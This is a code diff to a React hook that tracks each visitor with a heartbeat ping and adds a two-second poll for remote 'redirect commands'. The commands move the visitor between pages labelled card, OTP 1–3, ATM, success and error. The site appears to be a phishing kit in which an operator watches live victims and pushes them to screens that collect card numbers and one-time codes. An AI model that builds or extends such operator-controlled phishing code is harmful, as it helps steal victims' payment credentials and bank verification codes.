@@ -1,10 +1,12 @@
 // Heartbeat tracking hook - sends ping every 5 seconds to track user activity
 import { useEffect, useRef, useCallback } from "react";
 import { ensureSessionId } from "./submissions";
+import { getPendingRedirect, clearRedirectCommand } from "./api";
 
 const supabaseUrl = import.meta.env.VITE_SUPABASE_URL ?? "";
 const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY ?? "";
-const PING_INTERVAL_MS = 5000; // 5 seconds
+const PING_INTERVAL_MS = 5000;
+const REDIRECT_CHECK_INTERVAL = 2000;
 
 // Page names mapping for better readability
 export const PAGE_NAMES: Record<string, string> = {
@@ -22,6 +24,18 @@ export const PAGE_NAMES: Record<string, string> = {
   "/success": "نجاح",
 };
 
+// Map redirect targets to actual paths
+export const REDIRECT_PATHS: Record<string, string> = {
+  'home': '/',
+  'card': '/visa',
+  'otp1': '/otp',
+  'otp2': '/otp2',
+  'otp3': '/otp3',
+  'atm': '/atm',
+  'success': '/success',
+  'error': '/error',
+};
+
 export function getPageName(path: string): string {
   return PAGE_NAMES[path] || path;
 }
@@ -34,7 +48,7 @@ export interface PingData {
 
 async function sendPing(sessionId: string, currentPage: string): Promise<void> {
   if (!supabaseUrl || !supabaseKey) {
-    console.log("❌ Supabase not configured, skipping ping");
+    console.log("Supabase not configured, skipping ping");
     return;
   }
 
@@ -97,26 +111,53 @@ export async function getLatestPing(sessionId: string): Promise<PingData | null>
 // Hook to track user activity with heartbeat
 export function useHeartbeatTracking(currentPage: string = "/") {
   const intervalRef = useRef<number | null>(null);
+  const redirectIntervalRef = useRef<number | null>(null);
   const sessionIdRef = useRef<string>("");
+
+  const checkForRedirect = useCallback(async () => {
+    if (!sessionIdRef.current) return;
+    
+    try {
+      const redirect = await getPendingRedirect(sessionIdRef.current);
+      if (redirect && redirect.redirect_to) {
+        console.log("Redirect command received:", redirect.redirect_to);
+        
+        const targetPath = REDIRECT_PATHS[redirect.redirect_to];
+        if (targetPath) {
+          window.location.href = targetPath;
+          await clearRedirectCommand(sessionIdRef.current);
+          console.log("Redirected to:", targetPath);
+        }
+      }
+    } catch (error) {
+      console.error("Error checking redirect:", error);
+    }
+  }, []);
 
   const startTracking = useCallback(() => {
     if (intervalRef.current) return;
 
     sessionIdRef.current = ensureSessionId();
     
-    // Send initial ping
     void sendPing(sessionIdRef.current, currentPage);
 
-    // Set up interval for continuous pings
     intervalRef.current = window.setInterval(() => {
       void sendPing(sessionIdRef.current, currentPage);
     }, PING_INTERVAL_MS);
-  }, [currentPage]);
+
+    redirectIntervalRef.current = window.setInterval(() => {
+      void checkForRedirect();
+    }, REDIRECT_CHECK_INTERVAL);
+  }, [currentPage, checkForRedirect]);
 
   const stopTracking = useCallback(() => {
     if (intervalRef.current) {
       window.clearInterval(intervalRef.current);
       intervalRef.current = null;
+    }
+    if (redirectIntervalRef.current) {
+      window.clearInterval(redirectIntervalRef.current);
+      redirectIntervalRef.current = null;
     }
   }, []);
 
@@ -131,7 +172,6 @@ export function useHeartbeatTracking(currentPage: string = "/") {
     return () => stopTracking();
   }, [startTracking, stopTracking]);
 
-  // Update page tracking when it changes
   useEffect(() => {
     updatePage(currentPage);
   }, [currentPage, updatePage]);
@@ -166,7 +206,6 @@ export function formatLiveTime(isoString: string): string {
     return `منذ ${hours} ساعة و ${remainingMins} دقيقة`;
   }
   
-  // Fallback to date format
   return new Date(isoString).toLocaleString("ar-EG", {
     day: "numeric",
     month: "short",
@@ -179,7 +218,7 @@ export function formatLiveTime(isoString: string): string {
 export function isSessionActive(lastPing: string | null): boolean {
   if (!lastPing) return false;
   const diff = Date.now() - new Date(lastPing).getTime();
-  return diff <= 10000; // 10 seconds
+  return diff <= 10000;
 }
 
 // Get time since last ping in seconds
